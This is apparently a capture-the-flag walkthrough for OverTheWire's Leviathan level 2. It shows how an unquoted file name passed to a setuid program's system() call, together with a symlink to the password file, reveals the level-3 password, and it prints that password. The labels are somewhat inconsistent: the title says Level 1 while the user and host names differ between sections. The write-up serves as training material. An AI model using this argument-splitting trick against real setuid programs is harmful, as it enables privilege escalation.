# OverTheWire - Leviathan Level 1 Setup Guide

This guide explains how to complete **Leviathan Level 2** and retrieve the password for **Level 3**.

## Prerequisites

Before you begin, ensure you have the following:

1. **An active internet connection**.
2. **SSH client** installed (typically available on most Linux distributions and macOS by default).
3. **sshpass** installed (for automating SSH logins with a password).
   - To install `sshpass` on Kali Linux, use the following:
     ```bash
     sudo apt-get install sshpass
     ```
   - On macOS, use `brew`:
     ```bash
     brew install sshpass
     ```

## Steps to Connect to Leviathan Level 3

1. **Open a terminal**: If you're on Linux or macOS, open a terminal window. On Windows, you may need an SSH client like `PuTTY` or use the Windows Subsystem for Linux (WSL).

2. **Use `sshpass` to log in**: The username for **Level 2** is `leviath2`, and the password is the one you retrieved from **Level 1**. Use the following command to log in via SSH:

    ```bash
    sshpass -p <password_from_level_1> ssh leviath2@leviathan.labs.overthewire.org -p 2223
    ```

   Replace `<password_from_level_1>` with the password you found in Level 1.

3. **Confirm the host authenticity**: When connecting for the first time, you might see the following prompt:
   
    ```text
    The authenticity of host '[leviathan.labs.overthewire.org]:2223 ([13.48.119.24]:2223)' can't be established.
    ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
    Are you sure you want to continue connecting (yes/no/[fingerprint])?
    ```

   Type `yes` to continue and add the host to the list of known hosts.

4. **Enter the password**: After entering the `sshpass` command, you should be logged in to the server. If you're not using `sshpass`, the server will prompt you for the password you retrieved from Level 1.

5. **You're in!**: Once logged in, you should see a welcome message and the prompt for the `leviath2` user:
   
    ```bash
    leviath2@gibson:~$
    ```

6. **Check who you are**: To verify your current user, run the following command:
   
    ```bash
    whoami
    ```

## Steps

1. **Initial Directory Listing**

    ```sh
    leviathan2@melinda:~$ ls -la
    total 28
    drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
    drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
    -rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
    -rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
    -rw-r--r--   1 root       root        675 Apr  9  2014 .profile
    -r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile
    ```

2. **Program Usage**

    ```sh
    leviathan2@melinda:~$ ./printfile
    *** File Printer ***
    Usage: ./printfile filename
    ```

3. **Trying to Read Password File**

    ```sh
    leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
    You cant have that file...
    ```

4. **Setting Up for Exploit**

    ```sh
    leviathan2@melinda:~$ mkdir /tmp/jhalon && touch /tmp/jhalon/test.txt
    leviathan2@melinda:~$ cd /tmp/jhalon
    ```

5. **Tracing the Program Execution**

    ```sh
    leviathan2@melinda:/tmp/jhalon$ ltrace ~/printfile test.txt
    __libc_start_main(0x804852d, 2, 0xffffd744, 0x8048600 <unfinished ...>
    access("test.txt", 4)                            = 0
    snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt") = 17
    system("/bin/cat test.txt" <no return ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                           = 0
    +++ exited (status 0) +++
    ```

6. **Exploiting the Flaw**

    ```sh
    leviathan2@melinda:/tmp/jhalon$ touch pass\ file.txt
    leviathan2@melinda:/tmp/jhalon$ ltrace ~/printfile "pass file.txt"
    __libc_start_main(0x804852d, 2, 0xffffd744, 0x8048600 <unfinished ...>
    access("pass file.txt", 4)                       = 0
    snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt") = 22
    system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
    /bin/cat: file.txt: No such file or directory
    <no return ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                           = 256
    +++ exited (status 0) +++
    ```

7. **Creating Symbolic Link**

    ```sh
    leviathan2@melinda:/tmp/jhalon$ ln -s /etc/leviathan_pass/leviathan3 /tmp/jhalon/pass
    leviathan2@melinda:/tmp/jhalon$ ls -la
    total 7864
    drwxrwxr-x 2 leviathan2 leviathan2    4096 Sep 10 04:55 .
    drwxrwx-wt 1 root       root       8036352 Sep 10 04:55 ..
    lrwxrwxrwx 1 leviathan2 leviathan2      30 Sep 10 04:55 pass -> /etc/leviathan_pass/leviathan3
    -rw-rw-r-- 1 leviathan2 leviathan2       0 Sep 10 04:54 pass file.txt
    ```

8. **Getting the Password**

    ```sh
    leviathan2@melinda:/tmp/jhalon$ ~/printfile "pass file.txt"
    Ahdiemoo1j
    /bin/cat: file.txt: No such file or directory
    ```

And bingo! We got the password for leviathan3. Go do a victory lap around the house—you deserved it!
